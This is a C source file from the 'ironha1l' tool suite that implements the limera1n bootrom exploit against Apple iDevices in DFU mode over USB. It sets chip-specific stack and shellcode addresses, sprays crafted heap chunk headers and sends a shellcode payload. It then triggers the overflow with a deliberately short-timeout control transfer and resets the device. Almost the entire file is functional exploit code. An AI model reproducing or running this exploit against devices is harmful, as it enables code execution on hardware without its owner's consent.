//***************************************************************//
//** This file is part of ironha1l Tool Suite.                 **//
//** ironha1l, a DFU injector tool for iDevices.               **//
//**                                                           **//
//** ********************************************************* **//
//** --------------- Updated: Oct-10-2012 -------------------- **//
//** ********************************************************* **//
//**                                                           **//
//** Author: Pascal CLEMENT aka Thireus <ironha1l@thireus.com> **//
//**                                                           **//
//** http://ironha1l.thireus.com                               **//
//** http://blog.thireus.com                                   **//
//**                                                           **//
//** ironha1l Tool Suite,                                      **//
//** Copyright © 2012  Thireus.                                **//
//***************************************************************//
//**PLEASE REFER TO THE README FILE FOR ADDITIONAL INFORMATION!**//
//***************************************************************//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#include "limera1n.h"

int limera1n_inject0r(const unsigned chip_id, const unsigned idBus, libusb_context * device, const char * limera1n_payload) {
	
	// limera1n vars
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned int max_size = 0x24000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;
	
	// dev_handle
	libusb_device_handle * dev_handle;
	
	// Injection data
	char * data;
	unsigned dataLen; // used to store data lengths

	//irecv_device_t device = g_syringe_device;
	//irecv_client_t client = g_syringe_client;

	debug(L2, "[X] Initializing limera1n...\n");

	if (chip_id == 8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
	else if (chip_id == 8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}

	debug(L3, "[X] Resetting device counters.\n");
	//irecv_reset_counters(g_syringe_client);
	// = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
    data = "";
    dataLen = 0x0;
	dev_handle = inject0r(0x40|CTRL_OUT, idAPPLE, idDFU, idBus, device, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x4, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	debug(L2, "[X] Sending chunk headers...\n");
	//irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
    data = (char *) buf;
    dataLen = 0x800;
	inject0r(0xC0|CTRL_OUT, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x1, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		//irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	    data = (char *) buf;
	    dataLen = 0x800;
		inject0r(0xC0|CTRL_OUT, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x1, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers
	}

	debug(L2, "[X] Sending exploit payload...\n");
	//irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
    data = (char *) limera1n_payload;
    dataLen = 0x800;
	inject0r(0xC0|CTRL_FILE_OUT, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x1, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers

	debug(L2, "[X] Sending fake data...\n");
	memset(buf, 0xBB, 0x800);
	
	//irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
    data = (char *) buf;
    dataLen = 0x800;
	inject0r(0xC0|CTRL_IN, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0xA1, 0x1, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers

/*	THIS SOLUTION ONLY WORKS FOR LINUX, NOT MACOS... USE injectExploit() INSTEAD!
	//irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
    data = (char *) buf;
    dataLen = 0x800;
	inject0r(0xC0|CTRL_OUT, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x1, 0x0, 0x0, 1); // idVendor, idProduct, data, headers // 1 or 10 MILLISECONDES!!!!! We also store dev_handle, for timing issues
*/

    data = (char *) buf;
    dataLen = 0x800;
	injectExploit(dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x1, 0x0, 0x0, 1000);

	debug(L1, "[INFO] Next FAILED is part of the limera1n exploit ;)\n");

	//debug("Executing exploit\n");
	//irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
    data = (char *) buf;
    dataLen = 0x0;
	//inject0r(CTRL_OUT, idAPPLE, idDFU, idBus, device, (unsigned char *) data, (const unsigned *) dataLen, 0x21, 0x2, 0x0, 0x0, 1000); // idVendor, idProduct, data, headers
	
	inject0r(0xC0|CTRL_OUT, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, (unsigned char *) data, (const unsigned) dataLen, 0x21, 0x2, 0x0, 0x0, 1); // idVendor, idProduct, data, headers

	//injectCtrl(dev_handle, (unsigned char *) data, dataLen[1], 0x21, 0x2, 0x0, 0x0, 1000);
	//libusb_release_interface(dev_handle, 0); // Release the claimed interface

	//irecv_reset(client);

	inject0r(0x80|RESET, idAPPLE, idDFU, idBus, (libusb_context *)dev_handle, NULL, 0x0, 0, 0, 0, 0, 0);
	
	debug(L2, "[X] SUCCESS! limera1n exploit sent!\n");

	return 0;
}
